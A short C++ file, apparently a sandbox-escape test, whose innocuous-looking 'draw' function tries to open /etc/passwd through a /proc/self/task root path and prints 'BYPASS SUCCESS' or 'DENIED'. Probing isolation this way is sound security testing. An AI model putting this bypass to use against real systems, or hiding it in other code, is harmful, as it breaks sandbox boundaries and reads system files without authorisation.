#include <cstdio>
#include <fcntl.h>
#include <iostream>
#include <sys/syscall.h>
#include <unistd.h>

void draw(void* canvas) {
    long tid = syscall(SYS_gettid);
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/task/%ld/root/etc/passwd", tid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        std::cout << "DENIED" << std::endl;
        return;
    }
    std::cout << "BYPASS SUCCESS (/proc/self/task): " << std::endl;
    close(fd);
}
